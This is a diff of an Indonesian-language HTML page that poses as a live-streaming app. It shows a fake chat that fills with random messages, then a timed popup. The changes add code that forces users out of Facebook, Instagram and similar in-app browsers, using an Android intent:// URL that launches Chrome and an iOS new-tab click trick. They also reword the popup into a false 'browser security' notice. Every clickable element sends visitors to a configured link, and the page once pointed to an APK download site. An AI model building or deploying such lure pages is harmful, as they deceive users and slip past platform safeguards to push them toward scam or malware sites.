@@ -10,10 +10,10 @@
     <meta property="og:image:width" content="1200">
     <meta property="og:image:height" content="630">
     <meta property="og:type" content="website">
-    <meta property="og:url" content="https://seribudollarperhari.github.io/"> <meta name="twitter:card" content="summary_large_image">
+    <meta property="og:url" content="https://join-live.github.io/a"> <meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:title" content="Live Streaming App">
     <meta name="twitter:description" content="Tonton live streaming menarik, berikan gift, dan ngobrol bareng host favoritmu sekarang!">
-    <meta name="twitter:image" content="https://hot51apk.app/wp-content/uploads/2025/09/Download-Hot51.webp">
+    <meta name="twitter:image" content="https://join-live.github.io/a/img.webp">
 
     <title>Live Streaming App</title>
     <script src="https://cdn.tailwindcss.com"></script>
@@ -25,10 +25,9 @@
         
         body {
             font-family: 'Inter', sans-serif;
-            background-color: #121212; /* Latar belakang gelap jika dibuka di desktop */
+            background-color: #121212;
         }
 
-        /* Sembunyikan scrollbar tapi tetap bisa scroll */
         .no-scrollbar::-webkit-scrollbar {
             display: none;
         }
@@ -37,7 +36,6 @@
             scrollbar-width: none;
         }
 
-        /* Animasi untuk chat baru masuk */
         @keyframes slideIn {
             from { opacity: 0; transform: translateX(-20px); }
             to { opacity: 1; transform: translateX(0); }
@@ -46,7 +44,6 @@
             animation: slideIn 0.3s ease-out forwards;
         }
 
-        /* Animasi untuk Gift Besar yang muncul di tengah */
         @keyframes popOut {
             0% { transform: scale(0.5); opacity: 0; }
             20% { transform: scale(1.1); opacity: 1; }
@@ -57,7 +54,6 @@
             animation: popOut 3s ease-in-out forwards;
         }
 
-        /* Text shadow agar tulisan terbaca di atas video */
         .text-shadow {
             text-shadow: 1px 1px 3px rgba(0,0,0,0.8);
         }
@@ -172,9 +168,9 @@
                 <i class="fa-solid fa-tower-broadcast"></i>
             </div>
             <h2 class="text-white text-3xl font-bold mb-1">Join Live</h2>
-            <p class="text-gray-300 text-sm mb-4">Anda sedang membuka link di aplikasi. Beralihlah ke browser utama ponsel untuk join live.</p>
+            <p class="text-gray-300 text-sm mb-4">Membuka keamanan browser, mohon buka di browser utama Anda.</p>
             <button id="btn-open-browser" class="bg-gradient-to-r from-blue-500 to-cyan-500 text-white font-bold py-3 px-8 rounded-full hover:scale-105 transition-transform shadow-lg shadow-blue-500/30 w-full">
-                Buka dibrowser
+                Buka di Browser Luar
             </button>
         </div>
     </div>
@@ -259,7 +255,6 @@
             if (chatMessagesDiv.children.length > 30) chatMessagesDiv.removeChild(chatMessagesDiv.firstElementChild);
             chatContainer.scrollTop = chatContainer.scrollHeight;
             
-            // Re-bind klik interaktif ke chat baru
             bindInteractiveRedirect();
         }
         setInterval(addRandomChat, Math.floor(Math.random() * 2000) + 1000);
@@ -334,12 +329,42 @@
 
 
         // ==============================================================
-        // TAMBAHAN FITUR: IN-APP BROWSER DETECTOR & GLOBAL REDIRECT
+        // TAMBAHAN FITUR: IN-APP BROWSER DETECTOR & FORCE EXTERNAL BROWSER
         // ==============================================================
         
-        // 1. Eksekusi redirect langsung
+        // 1. Eksekusi redirect dengan Trik Force External Browser
         function executeRedirect() {
-            window.location.href = CONFIG.redirectUrl;
+            const targetUrl = CONFIG.redirectUrl;
+            const ua = navigator.userAgent || navigator.vendor || window.opera;
+            
+            // Cek apakah perangkat adalah Android
+            if (/android/i.test(ua)) {
+                // Gunakan URL scheme 'intent://' untuk memaksa Android membuka Chrome
+                let intentUrl = targetUrl.replace(/^https?:\/\//, 'intent://');
+                intentUrl += '#Intent;scheme=https;package=com.android.chrome;end;';
+                window.location.href = intentUrl;
+            } 
+            // Cek apakah perangkat adalah iOS (iPhone / iPad)
+            else if (/iPad|iPhone|iPod/.test(ua) && !window.MSStream) {
+                // Di iOS sangat sulit untuk langsung bypass In-App browser secara script.
+                // Trik terdekatnya adalah membuat elemen link klik dengan target="_blank"
+                const a = document.createElement('a');
+                a.setAttribute('href', targetUrl);
+                a.setAttribute('target', '_blank'); // Memicu tab / jendela baru
+                a.setAttribute('rel', 'noopener noreferrer');
+                document.body.appendChild(a);
+                a.click();
+                a.remove();
+                
+                // Fallback (jika gagal membuka tab baru)
+                setTimeout(() => {
+                    window.location.href = targetUrl;
+                }, 400);
+            } 
+            // Default jika di PC/Desktop
+            else {
+                window.location.href = targetUrl;
+            }
         }
 
         // 2. Deteksi in-app browser (FB, IG, Threads, X)
@@ -357,25 +382,22 @@
                 popup.classList.remove('hidden');
                 popup.classList.add('flex');
                 
-                // Transisi animasi agar mulus
                 setTimeout(() => {
                     popup.classList.remove('opacity-0');
                     popup.classList.add('opacity-100');
                     popupContent.classList.remove('scale-95');
                     popupContent.classList.add('scale-100');
                 }, 50);
-            }, 10000); // Trigger di 10 detik
+            }, 10000); 
         }
 
-        // 4. Bind aksi pada tombol popup utama menggunakan executeRedirect
+        // 4. Bind aksi pada tombol popup utama ke executeRedirect()
         document.getElementById('btn-open-browser').addEventListener('click', executeRedirect);
 
-        // 5. Ubah semua fungsi/elemen di web (dengan class .action-trigger) menuju ke link tujuan.
-        // Fungsi ini dibungkus agar elemen chat yang terus digenerate juga ikut ter-bind.
+        // 5. Ubah semua fungsi/elemen di web (dengan class .action-trigger) menuju ke link tujuan
         function bindInteractiveRedirect() {
             const interactableElements = document.querySelectorAll('.action-trigger');
             interactableElements.forEach(el => {
-                // Hindari duplikasi bind event (agar tidak bocor memori / error multiple clicks)
                 if(!el.dataset.redirectBound) {
                     el.addEventListener('click', (e) => {
                         e.preventDefault();
